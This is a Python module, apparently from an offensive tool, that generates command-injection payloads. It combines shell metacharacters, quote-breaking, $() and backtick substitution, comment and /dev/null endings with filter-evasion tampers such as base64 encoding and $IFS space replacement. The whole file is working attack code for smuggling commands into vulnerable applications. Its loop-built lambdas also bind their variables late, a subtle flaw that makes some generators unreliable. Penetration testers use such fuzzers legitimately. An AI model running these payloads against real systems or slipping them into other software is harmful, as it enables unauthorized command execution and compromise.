from typing import Generator, Callable

from raycharles.tampers import *


PayloadGenerator      = Callable[[str], str]

ENDINGS               = (">/dev/null", "2>/dev/null")
META_CHARS            = ("&&", "||", "&", "|", ";")
QUOTE_CHARS           = ("'", '"')
COMMENT_CHARS         = ("#",)
SUBSTITUTION_PATTERNS = ("$(%(cmd)s)", "`%(cmd)s`")

IDENTITY_LAMBDA       = lambda x: x
DEFAULT_TAMPERS       = [IDENTITY_LAMBDA, add_dollar_and_ats, replace_spaces_with_ifs]
DEFAULT_PRE_TAMPERS   = [IDENTITY_LAMBDA, encapsulate_into_curly_braces, encode_base64]


def build_payload_generators(
    tampers=DEFAULT_TAMPERS,
    pre_tampers=DEFAULT_PRE_TAMPERS,
) -> Generator[PayloadGenerator, None, None]:
    """ Build payload generators """

    for pre_tamper in pre_tampers:
        for tamper in tampers:
            yield lambda cmd: tamper(pre_tamper(cmd))

            for qc in QUOTE_CHARS:
                for sp in SUBSTITUTION_PATTERNS:
                    yield lambda cmd: tamper(qc + sp % {"cmd": pre_tamper(cmd)})

                    for cc in COMMENT_CHARS:
                        yield lambda cmd: tamper(
                            qc + sp % {"cmd": pre_tamper(cmd)} + cc
                        )

                    yield lambda cmd: tamper(sp % {"cmd": pre_tamper(cmd)} + qc)

                    for cc in COMMENT_CHARS:
                        yield lambda cmd: tamper(
                            sp % {"cmd": pre_tamper(cmd)} + qc + cc
                        )

                    yield lambda cmd: tamper(qc + sp % {"cmd": pre_tamper(cmd)} + qc)

                    for cc in COMMENT_CHARS:
                        yield lambda cmd: tamper(
                            qc + sp % {"cmd": pre_tamper(cmd)} + qc + cc
                        )

                for mc in META_CHARS:
                    yield lambda cmd: tamper(qc + mc + pre_tamper(cmd))

                    for cc in COMMENT_CHARS:
                        yield lambda cmd: tamper(qc + mc + pre_tamper(cmd) + cc)

                    for end in ENDINGS:
                        yield lambda cmd: tamper(qc + end + mc + pre_tamper(cmd))

                        for cc in COMMENT_CHARS:
                            yield lambda cmd: tamper(
                                qc + end + mc + pre_tamper(cmd) + cc
                            )

            for sp in SUBSTITUTION_PATTERNS:
                yield lambda cmd: tamper(sp % {"cmd": pre_tamper(cmd)})

            for mc in META_CHARS:
                yield lambda cmd: tamper(mc + pre_tamper(cmd))

                for cc in COMMENT_CHARS:
                    yield lambda cmd: tamper(mc + pre_tamper(cmd) + cc)

                for end in ENDINGS:
                    yield lambda cmd: tamper(end + mc + pre_tamper(cmd))

                    for cc in COMMENT_CHARS:
                        yield lambda cmd: tamper(end + mc + pre_tamper(cmd) + cc)
